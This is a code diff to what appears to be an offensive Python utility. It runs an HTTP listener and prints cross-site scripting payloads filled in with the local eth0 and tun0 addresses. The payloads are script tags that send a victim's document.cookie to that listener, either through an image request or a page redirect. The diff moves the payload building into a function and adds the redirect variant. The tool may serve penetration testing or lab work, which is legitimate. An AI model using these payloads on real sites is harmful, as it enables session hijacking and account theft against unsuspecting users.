@@ -89,7 +89,6 @@ def main():
     parser = argparse.ArgumentParser(description='Parse')
     parser.add_argument('-p','--port',help='Port to listen on', default='8082')
     args = parser.parse_args()
-
     PORT = int(args.port)
 
     def sighandler(signal_received, frame):
@@ -99,9 +98,21 @@ def main():
         exit(0)
 
     signal(SIGINT, sighandler)
-    
     handler = myHttpHandler
     httpd = socketserver.TCPServer(("", PORT), handler)
+
+    def payloadStr(iface):
+        ip = netifaces.ifaddresses(iface)
+        payloads = {
+            "\"><script>var i = new Image;i.src='//IP:PORT/?c'+document.cookie</script>",
+            "\"><script>document.location='//IP:PORT?c='+document.cookie</script>"
+            }
+        for p in payloads:
+            pay = p
+            pay = pay.replace("IP", ip[2][0]['addr'])
+            pay = pay.replace("PORT", str(PORT))
+            printColored("green", f"{iface}: ", end='')
+            printColored("white", pay)
 
     try:        
         printColored("dark_gray",  "\r\n" + "*"*20, end='')
@@ -114,19 +125,9 @@ def main():
         printColored("light_blue", "\nTest payloads for interfaces:")
         for iface in interfaces():
             if iface == "eth0":
-                ip = addrs = netifaces.ifaddresses(iface)
-                payloadStr = "\"><script>var i = new Image;i.src='//IP:PORT/?c'+document.cookie</script>"
-                payloadStr = payloadStr.replace("IP", ip[2][0]['addr'])
-                payloadStr = payloadStr.replace("PORT", str(PORT))
-                printColored("green", "eth0: ", end='')
-                printColored("white", payloadStr)
+                payloadStr(iface)
             if iface == "tun0":
-                ip = addrs = netifaces.ifaddresses(iface)
-                payloadStr = "\"><script>var i = new Image;i.src='//IP:PORT/?c'+document.cookie</script>"
-                payloadStr = payloadStr.replace("IP", ip[2][0]['addr'])
-                payloadStr = payloadStr.replace("PORT", str(PORT))
-                printColored("green", "tun0: ", end='')
-                printColored("white", payloadStr + "\n")
+                payloadStr(iface)
         printColored("yellow", "Waiting for requests...")
         httpd.serve_forever()
     except KeyboardInterrupt:
